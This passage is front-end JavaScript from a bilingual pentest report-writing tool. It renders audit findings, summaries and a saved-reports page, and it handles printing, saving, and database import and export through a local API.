                                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
                                    Evidencias
                                </h4>
                                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1rem;">
                                    ${f.images.map((img, imgIdx) => `
                                        <div style="border: 1px solid #e5e7eb; border-radius: 8px; overflow: hidden; break-inside: avoid; background: #fff; padding: 0.5rem;">
                                            <img src="${img}" alt="Evidencia ${imgIdx + 1}" style="width: 100%; height: auto; border-radius: 4px; display: block;">
                                        </div>
                                    `).join('')}
                                </div>
                            </div>
                        ` : ''}
                        
                        ${f.impact ? `
                            <div style="margin-bottom: 1.5rem;">
                                <h4 style="font-size: 1.125rem; font-weight: 700; color: #dc2626; margin-bottom: 0.75rem; display: flex; align-items: center; gap: 0.5rem;">
                                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
                                    Impacto en el Negocio
                                </h4>
                                <p style="color: #4b5563; line-height: 1.6; word-wrap: break-word;"><span style="white-space: pre-wrap;">${formatMultiline(f.impact)}</span></p>
                            </div>
                        ` : ''}
                        
                        ${f.remediation ? `
                            <div style="margin-bottom: 0; background: #f0fdf4; padding: 1.5rem; border-radius: 8px; border: 1px solid #bbf7d0;">
                                <h4 style="font-size: 1.125rem; font-weight: 700; color: #166534; margin-bottom: 0.75rem; display: flex; align-items: center; gap: 0.5rem;">
                                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
                                    Solución y Remediación
                                </h4>
                                <p style="color: #15803d; line-height: 1.6; word-wrap: break-word;"><span style="white-space: pre-wrap;">${formatMultiline(f.remediation)}</span></p>
                            </div>
                        ` : ''}
                    </div>
                `).join('')}
            </div>

            <!-- RESUMEN FINAL DE LA AUDITORÍA -->
            ${d.auditSummary || d.testsPerformed || d.recommendedSolutions ? `
            <div style="padding: 2rem 0; page-break-before: always;">
                <h2 style="font-size: 2rem; color: #111827; margin-bottom: 2rem; border-bottom: 3px solid #2563eb; padding-bottom: 0.75rem; font-weight: 800;">
                    ${state.lang === 'es' ? 'Conclusiones y Resumen de la Auditoría' : 'Audit Conclusions and Summary'}
                </h2>
                
                ${d.auditSummary ? `
                <div id="audit-summary" style="margin-bottom: 2.5rem;">
                    <h3 style="font-size: 1.5rem; color: #1f2937; margin-bottom: 1rem; font-weight: 700; display: flex; align-items: center; gap: 0.5rem;">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#2563eb" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>
                        ${t.auditSummary}
                    </h3>
                    <div style="background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 1.5rem; line-height: 1.8; color: #374151;">
                        <span style="white-space: pre-wrap;">${formatMultiline(d.auditSummary)}</span>
                    </div>
                </div>
                ` : ''}
                
                ${d.testsPerformed ? `
                <div id="tests-performed" style="margin-bottom: 2.5rem;">
                    <h3 style="font-size: 1.5rem; color: #1f2937; margin-bottom: 1rem; font-weight: 700; display: flex; align-items: center; gap: 0.5rem;">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#059669" stroke-width="2"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"></path></svg>
                        ${t.testsPerformed}
                    </h3>
                    <div style="background: #f0fdf4; border: 1px solid #bbf7d0; border-radius: 10px; padding: 1.5rem; line-height: 1.8; color: #374151;">
                        <span style="white-space: pre-wrap;">${formatMultiline(d.testsPerformed)}</span>
                    </div>
                </div>
                ` : ''}
                
                ${d.recommendedSolutions ? `
                <div id="recommended-solutions">
                    <h3 style="font-size: 1.5rem; color: #1f2937; margin-bottom: 1rem; font-weight: 700; display: flex; align-items: center; gap: 0.5rem;">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#7c3aed" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path><path d="M12 8v4"></path><path d="M12 16h.01"></path></svg>
                        ${t.recommendedSolutions}
                    </h3>
                    <div style="background: #faf5ff; border: 1px solid #e9d5ff; border-radius: 10px; padding: 1.5rem; line-height: 1.8; color: #374151;">
                        <span style="white-space: pre-wrap;">${formatMultiline(d.recommendedSolutions)}</span>
                    </div>
                </div>
                ` : ''}
            </div>
            ` : ''}
        </div>
    `;
}


function renderReportsPage() {
    if (!state.showReportSelector || state.showSplash) return '';

    const t = UI[state.lang];
    const tImpExp = state.lang === 'es' ? {
        exportDb: 'Exportar BD',
        importDb: 'Importar BD',
        importConfirm: '¿Estás seguro? Esto reemplazará todos los reportes actuales.',
        importSuccess: 'Base de datos importada correctamente. Recargando...',
        importError: 'Error al importar: '
    } : {
        exportDb: 'Export DB',
        importDb: 'Import DB',
        importConfirm: 'Are you sure? This will replace all current reports.',
        importSuccess: 'Database imported successfully. Reloading...',
        importError: 'Error importing: '
    };

    return `
        <div class="reports-page">
            <div class="reports-header">
                <h1>${t.myReports}</h1>
                <div class="reports-actions">
                    <button class="btn-secondary" onclick="exportDatabase()">
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
                            <polyline points="7 10 12 15 17 10"/>
                            <line x1="12" y1="15" x2="12" y2="3"/>
                        </svg>
                        ${tImpExp.exportDb}
                    </button>
                    <button class="btn-secondary" onclick="document.getElementById('db-import-input').click()">
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
                            <polyline points="17 8 12 3 7 8"/>
                            <line x1="12" y1="3" x2="12" y2="15"/>
                        </svg>
                        ${tImpExp.importDb}
                    </button>
                    <input type="file" id="db-import-input" accept=".db" style="display:none" onchange="importDatabase(this)">
                </div>
            </div>

            <div class="reports-list">
                ${state.savedReports.length === 0 ? `
                    <div class="empty-state">
                        <p>${t.noReports}</p>
                        <p class="text-muted">${t.noReportsDesc}</p>
                    </div>
                ` : state.savedReports.map(r => `
                    <div class="report-card" onclick="loadReport(${r.id})">
                        <h3>${escapeHTML(r.document_title)}</h3>
                        <p>${escapeHTML(r.client_company)}</p>
                        <span>${r.findings_count || 0} hallazgos</span>
                        <button onclick="event.stopPropagation(); deleteReport(${r.id})">Eliminar</button>
                    </div>
                `).join('')}
            </div>
        </div>
    `;
}

function renderApp() {
    const app = $('#app');

    app.innerHTML = `
        ${renderSplashScreen()}
        ${renderNavbar()}
        <main class="main-content">
            ${renderReportsPage()}
            ${renderEditor()}
            ${renderPreview()}
        </main>
    `;
}

function enterApp() {
    state.showSplash = false;
    renderApp();
}

function setLang(lang) {
    state.lang = lang;
    state.auditData.lang = lang;
    renderApp();
}

function setTab(tab) {
    state.activeTab = tab;
    renderApp();
}

function printReport() {
    const printContent = document.querySelector('.preview-container');
    if (!printContent) {
        alert(state.lang === 'es' ? 'Primero ve a la vista previa' : 'Go to preview first');
        return;
    }
    
    const iframe = document.createElement('iframe');
    iframe.style.position = 'fixed';
    iframe.style.right = '0';
    iframe.style.bottom = '0';
    iframe.style.width = '0';
    iframe.style.height = '0';
    iframe.style.border = '0';
    iframe.style.visibility = 'hidden';
    document.body.appendChild(iframe);
    
    const doc = iframe.contentWindow.document;
    doc.open();
    doc.write(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>${state.auditData.documentTitle}</title>
            <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
            <link rel="stylesheet" href="${window.location.origin}/css/styles.css">
            <style>
                @page { margin: 10mm 20mm 18mm 20mm; size: A4; }
                @media print {
                    body { -webkit-print-color-adjust: exact !important; print-color-adjust: exact !important; }
                    .navbar, .no-print { display: none !important; }
                }
            </style>
        </head>
        <body style="margin:0; padding:0; background:white;">
            ${printContent.outerHTML}
        </body>
        </html>
    `);
    doc.close();
    
    iframe.onload = () => {
        setTimeout(() => {
            iframe.contentWindow.print();
            setTimeout(() => {
                document.body.removeChild(iframe);
            }, 1000);
        }, 500);
    };
    
    if (iframe.contentDocument.readyState === 'complete') {
        iframe.onload();
    }
}

async function showReports() {
    await loadSavedReports();
    state.showReportSelector = true;
    renderApp();
}

function hideReports() {
    state.showReportSelector = false;
    renderApp();
}

function updateAuditData(field, value) {
    state.auditData[field] = value;
    state.isDirty = true;
}

function updateCurrentFinding(field, value) {
    state.currentFinding[field] = value;
    if (field === 'cvss') {
        const score = parseFloat(value);
        if (!isNaN(score)) {
            let sev = 'info';
            if (score >= 9.0) sev = 'crit';
            else if (score >= 7.0) sev = 'high';
            else if (score >= 4.0) sev = 'med';
            else if (score > 0.0) sev = 'low';
            
            state.currentFinding.severity = sev;
            const severitySelect = document.getElementById('findingSeverity');
            if (severitySelect) {
                severitySelect.value = sev;
            }
        }
    }
}

function applyTemplate(key) {
    if (key === 'custom') return;

    const template = templates[key];
    if (!template) return;

    const t = template[state.lang] || template.es;

    let calculatedSeverity = state.currentFinding.severity || 'med';
    if (t.cvss) {
        const score = parseFloat(t.cvss);
        if (!isNaN(score)) {
            if (score >= 9.0) calculatedSeverity = 'crit';
            else if (score >= 7.0) calculatedSeverity = 'high';
            else if (score >= 4.0) calculatedSeverity = 'med';
            else if (score > 0.0) calculatedSeverity = 'low';
            else calculatedSeverity = 'info';
        }
    }

    state.currentFinding = {
        ...state.currentFinding,
        templateKey: key,
        title: t.title,
        severity: calculatedSeverity,
        description: t.description,
        poc: t.poc || '',
        impact: t.impact,
        remediation: t.remediation,
        cvss: t.cvss,
        reference: t.reference
    };

    renderApp();
}

function filterTemplates(query) {
    const select = document.getElementById('templateSelect');
    const filter = query.toLowerCase();

    if (!select) return;

    // Show dropdown when filtering
    select.style.display = 'block';

    // Get all options and optgroups
    const options = select.querySelectorAll('option');
    const optgroups = select.querySelectorAll('optgroup');

    // Filter options
    options.forEach(option => {
        const text = option.textContent.toLowerCase();
        const value = option.value.toLowerCase();
        if (text.includes(filter) || value.includes(filter) || filter === '') {
            option.style.display = '';
        } else {
            option.style.display = 'none';
        }
    });

    // Show/hide optgroups based on visible children
    optgroups.forEach(group => {
        const visibleOptions = group.querySelectorAll('option:not([style*="display: none"])');
        group.style.display = visibleOptions.length > 0 ? '' : 'none';
    });
}

function showTemplateDropdown() {
    const select = document.getElementById('templateSelect');
    const searchInput = document.getElementById('templateSearch');
    if (select) {
        select.style.display = 'block';
        // Reset filter when showing
        const options = select.querySelectorAll('option');
        const optgroups = select.querySelectorAll('optgroup');
        options.forEach(option => option.style.display = '');
        optgroups.forEach(group => group.style.display = '');
    }
    // Clear search input
    if (searchInput) searchInput.value = '';
}

function hideTemplateDropdown() {
    const select = document.getElementById('templateSelect');
    if (select) {
        select.style.display = 'none';
    }
}

// Hide dropdown when clicking outside
document.addEventListener('click', function(e) {
    const container = document.querySelector('.template-search-container');
    const select = document.getElementById('templateSelect');
    if (container && !container.contains(e.target) && select) {
        select.style.display = 'none';
    }
});

function handleFindingSubmit(e) {
    e.preventDefault();

    const finding = {
        id: state.editingFindingIndex !== null ? state.findings[state.editingFindingIndex].id : Date.now(),
        templateKey: state.currentFinding.templateKey,
        title: $('#findingTitle').value,
        severity: $('#findingSeverity').value,
        description: $('#findingDescription').value,
        cvss: $('#findingCvss').value,
        poc: $('#findingPoc').value,
        impact: $('#findingImpact').value,
        remediation: $('#findingRemediation').value,
        reference: $('#findingReference').value,
        cve: $('#findingCve').value,
        images: state.currentFinding.images
    };

    if (state.editingFindingIndex !== null) {
        // Update existing finding
        state.findings[state.editingFindingIndex] = finding;
        state.editingFindingIndex = null;
    } else {
        // Add new finding
        state.findings.push(finding);
    }

    const severityWeights = { crit: 5, high: 4, med: 3, low: 2, info: 1 };
    state.findings.sort((a, b) => {
        const weightDiff = severityWeights[b.severity] - severityWeights[a.severity];
        if (weightDiff !== 0) return weightDiff;
        const cvssA = parseFloat(a.cvss) || 0;
        const cvssB = parseFloat(b.cvss) || 0;
        return cvssB - cvssA;
    });

    state.isDirty = true;

    if (state.currentReportId) {
        localStorage.removeItem('report_' + state.currentReportId + '_draft');
    }

    resetFindingForm();
    renderApp();
}

function resetFindingForm() {
    state.editingFindingIndex = null;
    state.currentFinding = {
        templateKey: 'custom',
        title: '',
        severity: 'med',
        description: '',
        cvss: '',
        poc: '',
        impact: '',
        remediation: '',
        reference: '',
        cve: '',
        images: []
    };
}

function deleteFinding(index) {
    state.findings.splice(index, 1);
    state.isDirty = true;
    renderApp();
}

function editFinding(index) {
    const finding = state.findings[index];
    if (!finding) return;

    // Load finding data into currentFinding
    state.currentFinding = {
        templateKey: finding.templateKey || 'custom',
        title: finding.title || '',
        severity: finding.severity || 'med',
        description: finding.description || '',
        cvss: finding.cvss || '',
        poc: finding.poc || '',
        impact: finding.impact || '',
        remediation: finding.remediation || '',
        reference: finding.reference || '',
        cve: finding.cve || '',
        images: finding.images ? [...finding.images] : []
    };

    // Store the index we're editing
    state.editingFindingIndex = index;

    // Scroll to the form
    const form = document.getElementById('findingForm');
    if (form) {
        form.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }

    renderApp();
}

function handleImageUpload(event) {
    const files = event.target.files;
    if (!files || files.length === 0) return;

    Array.from(files).forEach(file => {
        if (!file.type.startsWith('image/')) return;

        const reader = new FileReader();
        reader.onload = (e) => {
            state.currentFinding.images.push(e.target.result);
            renderApp();
        };
        reader.readAsDataURL(file);
    });
    event.target.value = '';
}

function removeImage(index) {
    state.currentFinding.images.splice(index, 1);
    renderApp();
}

function handleImagePaste(event) {
    event.preventDefault();
    const items = event.clipboardData?.items;
    if (!items) return;

    let hasImages = false;

    Array.from(items).forEach(item => {
        if (item.type.startsWith('image/')) {
            hasImages = true;
            const blob = item.getAsFile();
            if (blob) {
                const reader = new FileReader();
                reader.onload = (e) => {
                    state.currentFinding.images.push(e.target.result);
                    renderApp();
                };
                reader.readAsDataURL(blob);
            }
        }
    });

    if (hasImages) {
        event.stopPropagation();
    }
}

function handleClientLogoUpload(event, index) {
    const file = event.target.files[0];
    if (!file || !file.type.startsWith('image/')) return;
    const reader = new FileReader();
    reader.onload = (e) => {
        const newLogos = [...state.auditData.clientLogo];
        newLogos[index] = e.target.result;
        updateAuditData('clientLogo', newLogos);
        renderApp();
    };
    reader.readAsDataURL(file);
}

function removeClientLogo(index) {
    const newLogos = [...state.auditData.clientLogo];
    newLogos[index] = '';
    updateAuditData('clientLogo', newLogos);
    renderApp();
}

async function loadSavedReports() {
    try {
        state.savedReports = await API.reports.getAll();
    } catch (err) {
        console.error('Error loading reports:', err);
    }
}

async function createNewReport() {
    try {
        const report = await API.reports.create({
            document_title: 'Nuevo Reporte',
            client_company: 'Empresa',
            client_logo: ['', ''],
            target_asset: 'Sistema',
            auditor_company: 'Auditor',
            auditor_name: 'Auditor',
            classification: 2,
            version: '1.0',
            date: new Date().toISOString().split('T')[0],
            lang: state.lang
        });

        state.currentReportId = report.id;
        state.findings = [];
        state.isDirty = false;
        hideReports();
    } catch (err) {
        alert('Error creating report: ' + err.message);
    }
}

async function loadReport(id) {
    try {
        const report = await API.reports.getById(id);
        state.currentReportId = report.id;
        state.auditData = {
            documentTitle: report.document_title,
            clientCompany: report.client_company,
            clientLogo: report.client_logo && Array.isArray(report.client_logo) ? report.client_logo : ['', ''],
            targetAsset: report.target_asset,
            auditorCompany: report.auditor_company,
            auditorName: report.auditor_name,
            classification: report.classification.toString(),
            version: report.version,
            date: report.date,
            lang: report.lang,
            hasIncidents: report.has_incidents || false,
            incidentsText: report.incidents_text || '',
            auditSummary: report.audit_summary || '',
            testsPerformed: report.tests_performed || '',
            recommendedSolutions: report.recommended_solutions || ''
        };
        state.lang = report.lang;
        state.findings = report.findings || [];
        
        const draft = localStorage.getItem('report_' + report.id + '_draft');
        if (draft) {
            try {
                state.currentFinding = JSON.parse(draft);
            } catch(e) {
                resetFindingForm();
            }
        } else {
            resetFindingForm();
        }
        
        state.isDirty = false;
        hideReports();
    } catch (err) {
        alert('Error loading report: ' + err.message);
    }
}

async function deleteReport(id) {
    if (!confirm('¿Eliminar este reporte?')) return;

    try {
        await API.reports.delete(id);
        if (state.currentReportId === id) {
            state.currentReportId = null;
        }
        loadSavedReports();
        renderApp();
    } catch (err) {
        alert('Error deleting report: ' + err.message);
    }
}

async function exportDatabase() {
    try {
        const response = await fetch('/api/database/export');
        if (!response.ok) throw new Error('Error al exportar');
        
        const blob = await response.blob();
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = response.headers.get('content-disposition')?.split('filename=')[1]?.replace(/"/g, '') || 'pentestify_backup.db';
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
        document.body.removeChild(a);
    } catch (err) {
        alert(state.lang === 'es' ? 'Error al exportar: ' + err.message : 'Error exporting: ' + err.message);
    }
}

async function importDatabase(input) {
    const file = input.files[0];
    if (!file) return;
    
    const tImpExp = state.lang === 'es' ? {
        importConfirm: '¿Estás seguro? Esto reemplazará todos los reportes actuales.',
        importSuccess: 'Base de datos importada correctamente. Recargando...',
        importError: 'Error al importar: '
    } : {
        importConfirm: 'Are you sure? This will replace all current reports.',
        importSuccess: 'Database imported successfully. Reloading...',
        importError: 'Error importing: '
    };
    
    if (!confirm(tImpExp.importConfirm)) {
        input.value = '';
        return;
    }
    
    try {
        const formData = new FormData();
        formData.append('file', file);
        
        const response = await fetch('/api/database/import', {
            method: 'POST',
            body: formData
        });
        
        if (!response.ok) {
            const error = await response.json();
            throw new Error(error.detail || 'Error desconocido');
        }
        
        alert(tImpExp.importSuccess);
        window.location.reload();
    } catch (err) {
        alert(tImpExp.importError + err.message);
    }
    
    input.value = '';
}

async function saveCurrentReport() {
    try {
        if (!state.currentReportId) {
            const report = await API.reports.create({
                document_title: state.auditData.documentTitle,
                client_company: state.auditData.clientCompany,
                client_logo: state.auditData.clientLogo || ['', ''],
                target_asset: state.auditData.targetAsset,
                auditor_company: state.auditData.auditorCompany,
                auditor_name: state.auditData.auditorName,
                classification: parseInt(state.auditData.classification) || 2,
                version: state.auditData.version,
                date: state.auditData.date,
                lang: state.auditData.lang || state.lang,
                audit_summary: state.auditData.auditSummary || '',
                tests_performed: state.auditData.testsPerformed || '',
                recommended_solutions: state.auditData.recommendedSolutions || ''
            });
            state.currentReportId = report.id;
        } else {
            await API.reports.update(state.currentReportId, {
                document_title: state.auditData.documentTitle,
                client_company: state.auditData.clientCompany,
                client_logo: state.auditData.clientLogo || ['', ''],
                target_asset: state.auditData.targetAsset,
                auditor_company: state.auditData.auditorCompany,
                auditor_name: state.auditData.auditorName,
                classification: parseInt(state.auditData.classification) || 2,
                version: state.auditData.version,
                date: state.auditData.date,
                lang: state.auditData.lang || state.lang,
                audit_summary: state.auditData.auditSummary || '',
                tests_performed: state.auditData.testsPerformed || '',
                recommended_solutions: state.auditData.recommendedSolutions || ''
            });
        }
        const remoteReport = await API.reports.getById(state.currentReportId);
        const existingFindings = remoteReport.findings || [];
        const existingIds = existingFindings.map(f => f.id);
        const currentIds = state.findings.filter(f => f.id && typeof f.id !== 'string' && f.id < 1000000000000).map(f => f.id);

        for (const id of existingIds) {
            if (!currentIds.includes(id)) {
                await API.findings.delete(id);
            }
        }

        for (let i = 0; i < state.findings.length; i++) {
            const finding = state.findings[i];
            const payload = {
                template_key: finding.templateKey || finding.template_key || 'custom',
                title: finding.title,
                severity: finding.severity,
                description: finding.description || '',
                cvss: finding.cvss || '',
                poc: finding.poc || '',
                impact: finding.impact || '',
                remediation: finding.remediation || '',
                reference: finding.reference || '',
                cve: finding.cve || '',
                images: finding.images || [],
                order_index: i
            };

            if (!finding.id || finding.id > 1000000000000) {
                const created = await API.findings.create(state.currentReportId, payload);
                finding.id = created.id;
            } else {
                await API.findings.update(finding.id, payload);
            }
        }

        if (state.currentReportId) {
            localStorage.setItem('report_' + state.currentReportId + '_draft', JSON.stringify(state.currentFinding));
        }

        state.isDirty = false;
        renderApp();
        alert(state.lang === 'es' ? 'Reporte guardado correctamente' : 'Report saved successfully');
    } catch (err) {
        console.error(err);
        alert('Error: ' + err.message);
    }
}

document.addEventListener('DOMContentLoaded', async () => {
    const params = new URLSearchParams(window.location.search);
    const printMode = params.get('print_mode');
    const reportId = params.get('report_id');

    if (printMode === 'true' && reportId) {
        state.showSplash = false;
        state.activeTab = 'preview';
        state.currentReportId = parseInt(reportId);
        
        try {
            const remoteReport = await API.reports.getById(state.currentReportId);
            Object.keys(remoteReport).forEach(key => {
                const camelKey = key.replace(/([-_][a-z])/ig, ($1) => $1.toUpperCase().replace('-', '').replace('_', ''));
                if (state.auditData.hasOwnProperty(camelKey)) {
                    state.auditData[camelKey] = remoteReport[key];
                }
            });

            state.hasIncidents = remoteReport.has_incidents || false;
            state.auditData.incidentsText = remoteReport.incidents_text || '';

            state.findings = remoteReport.findings ? remoteReport.findings.sort((a,b)=>a.order_index-b.order_index) : [];
        } catch (e) {
            console.error("Error cargando reporte para imprimir", e);
        }
        renderApp();
    } else {
        renderApp();
    }
});
